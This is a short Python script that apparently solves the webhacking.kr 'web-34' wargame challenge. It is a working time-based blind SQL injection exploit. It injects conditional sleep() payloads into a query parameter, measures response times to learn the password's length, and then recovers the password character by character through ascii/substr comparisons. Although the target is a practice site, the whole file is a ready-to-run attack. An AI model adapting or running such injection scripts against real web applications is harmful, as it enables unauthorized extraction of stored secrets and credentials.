from time import *
from requests import *
key='Done'
result=0
leng=0
s=session()
for i in range(30):
    url=f'https://webhacking.kr/challenge/web-34/index.php?msg=123&se=if(length(pw)={i},sleep(3.0),1)'
    start=time()
    response=get(url=url)
    if response.text.find(key) != -1:
        end=time()
        result=end-start
        if result > 3:
                print('flag length: ',i)
                leng=i
for i in range(1,leng+1):
        for j in range(30,128):
                url=f'https://webhacking.kr/challenge/web-34/index.php?msg=123&se=if(ascii(substr(pw,{i},1))like({j}),sleep(3.0),1)'
                start=time()
                response=get(url=url)
                if response.text.find(key)!=-1:
                        end=time()
                        result=end-start
                        if result > 3:
                                print(chr(j),end='')
                                break
print('\n')